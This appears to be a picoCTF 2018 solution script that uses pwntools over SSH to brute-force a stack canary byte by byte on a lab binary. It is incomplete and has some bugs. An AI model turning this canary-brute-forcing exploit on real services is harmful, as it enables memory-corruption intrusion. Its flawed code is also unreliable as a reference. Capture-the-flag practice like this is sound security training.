from pwn import *

s = ssh(host = '2018shell2.picoctf.com', user = 'user_name', password = 'password')

canary = ""
canary_offset = 32
guess = 0x0

buf = ""
buf += "A"*canary_offset
buf += canary

while len(canary) < 4:
	while guess != 0xff:
		p = s.process('./vuln', cwd = '/problems/buffer-overflow-3_0_dcd896c1491ad710043225eda6abcd8a')
		p.recvuntil('> ')
		p.sendline(10000000)
		
		p.recvuntil('> ')
		p.send(buf + chr(guess))
		d = p.recv()

		if "*** Stack Smashing Detected ***" in d:
			guess += 1

		else:
			print "Guessed correct byte:", format(guess, '02x')
			buf += chr(guess)
			guess = 0x00
			break
